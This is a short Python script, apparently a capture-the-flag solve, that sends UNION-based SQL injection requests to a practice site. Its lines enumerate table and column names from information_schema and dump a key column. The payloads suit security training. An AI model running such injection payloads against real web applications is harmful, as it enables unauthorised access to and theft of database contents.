# 送分题
import requests

target = 'http://ctf5.shiyanbar.com/8/index.php?id=1'

# r = requests.get(target+' UNION SELECT 1, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE TABLE_SCHEMA = DATABASE())')
#
# r = requests.get(target+' UNION SELECT 1, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=\'thiskey\')')

r = requests.get(target+' UNION SELECT 1, (SELECT GROUP_CONCAT(k0y) from thiskey)')

# r = requests.get(target+' UNION SELECT 1, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=\'news\')')
#
# r = requests.get(target+' UNION SELECT 1, (SELECT GROUP_CONCAT(id, content) from news)')

print(r.content.decode())
